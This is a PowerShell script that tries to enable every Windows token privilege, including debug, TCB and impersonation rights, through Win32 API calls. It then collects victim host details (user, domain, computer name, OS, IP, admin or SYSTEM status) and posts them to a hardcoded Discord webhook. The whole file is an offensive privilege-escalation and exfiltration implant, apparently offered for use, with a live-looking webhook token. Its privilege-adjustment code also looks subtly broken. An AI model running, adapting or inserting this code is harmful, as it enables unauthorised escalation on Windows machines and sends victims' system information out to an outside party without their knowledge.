# enable_all_privs.ps1
Add-Type -AssemblyName System.Web

$privs = @(
    "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
    "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
    "SeCreatePermanentPrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege",
    "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege",
    "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeManageVolumePrivilege",
    "SeProfileSingleProcessPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege",
    "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",
    "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege",
    "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeUndockPrivilege"
)

$source = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, 
        ref long NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
}
"@
Add-Type $source

$token = [IntPtr]::Zero
[Win32]::OpenProcessToken((Get-Process -Id $PID).Handle, 0x0028, [ref]$token) | Out-Null

foreach ($priv in $privs) {
    $luid = 0
    if ([Win32]::LookupPrivilegeValue($null, $priv, [ref]$luid)) {
        $newState = $luid -bor 0x00000002L
        [Win32]::AdjustTokenPrivileges($token, $false, [ref]$newState, 16, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
    }
}

$info = @{
    username     = $env:USERNAME
    computername = $env:COMPUTERNAME
    domain       = $env:USERDOMAIN
    os           = (Get-CimInstance Win32_OperatingSystem).Caption
    arch         = $env:PROCESSOR_ARCHITECTURE
    local_ip     = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1 | Select -Exp IPv4Address).IPAddressToString
    is_admin     = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")
    is_system    = ([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem
    time         = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
}

$json = $info | ConvertTo-Json -Compress

$webhook = "https://discord.com/api/webhooks/1381109681250111498/BXc8AHFVlV6atxurL_gE5p01cf09brPzQRaJQbqU2Mm6eqO_V6FYQQ0CHUO4Le7bl5pC"
$body = @{ content = "```json`n$json`n```" } | ConvertTo-Json

Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'

# Write-Host "Privileges enabled + info sent" -ForegroundColor Green
